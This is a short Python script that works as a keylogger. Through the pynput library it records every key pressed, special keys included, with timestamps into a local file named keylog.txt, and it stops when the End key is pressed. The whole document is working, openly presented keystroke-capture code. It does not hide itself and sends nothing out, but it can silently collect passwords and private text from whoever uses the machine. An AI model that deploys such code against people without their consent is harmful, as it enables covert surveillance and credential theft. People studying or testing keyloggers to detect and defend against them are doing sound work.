from pynput import keyboard
import logging

# Set up logging to write to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
       # it is used for the special keys like (ctrl ,shift ,alt) 
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == keyboard.Key.end:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
